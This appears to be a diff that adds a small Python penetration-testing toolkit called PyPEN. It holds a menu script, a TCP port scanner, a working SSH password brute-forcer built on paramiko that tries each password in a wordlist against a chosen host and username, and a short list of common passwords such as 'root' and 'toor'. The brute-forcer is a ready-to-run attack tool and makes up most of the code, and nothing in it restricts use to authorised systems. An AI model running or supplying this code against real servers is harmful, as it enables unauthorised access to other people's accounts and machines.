@@ -1,0 +1,85 @@
+# main.py
+
+import sys
+from modules import port_scanner, ssh_brute_forcer
+
+def main():
+    print("=== PyPEN: Penetration Testing Toolkit ===")
+    print("1. Port Scanner")
+    print("2. SSH Brute Forcer")
+    print("3. Exit")
+
+    choice = input("Enter your choice: ")
+
+    if choice == "1":
+        target = input("Enter target IP or domain: ")
+        port_scanner.scan_ports(target)
+    elif choice == "2":
+        host = input("Enter SSH host IP: ")
+        username = input("Enter username: ")
+        wordlist = input("Enter path to password wordlist (e.g., wordlists/passwords.txt): ")
+        ssh_brute_forcer.brute_force_ssh(host, username, wordlist)
+    elif choice == "3":
+        sys.exit()
+    else:
+        print("Invalid choice. Try again.")
+
+if __name__ == "__main__":
+    main()
+# modules/__init__.py
+# modules/port_scanner.py
+
+import socket
+
+def scan_ports(target):
+    print(f"\nScanning ports on {target}...\n")
+    open_ports = []
+    for port in range(1, 101):  # Scan ports 1 to 100
+        try:
+            sock = socket.socket()
+            sock.settimeout(0.5)
+            sock.connect((target, port))
+            print(f"[+] Port {port} is open")
+            open_ports.append(port)
+            sock.close()
+        except:
+            pass
+    if not open_ports:
+        print("[-] No open ports found.")
+# modules/ssh_brute_forcer.py
+
+import paramiko
+
+def brute_force_ssh(host, username, wordlist_path):
+    print(f"\nStarting SSH brute force on {host} with username '{username}'\n")
+    
+    try:
+        with open(wordlist_path, 'r') as file:
+            passwords = file.readlines()
+    except FileNotFoundError:
+        print("Wordlist not found.")
+        return
+
+    for password in passwords:
+        password = password.strip()
+        try:
+            print(f"[*] Trying: {password}")
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(host, username=username, password=password, timeout=3)
+            print(f"[+] Success! Password found: {password}")
+            ssh.close()
+            return
+        except paramiko.AuthenticationException:
+            continue
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            break
+
+    print("[-] Password not found in the wordlist.")
+123456
+admin
+root
+password
+toor
+letmein
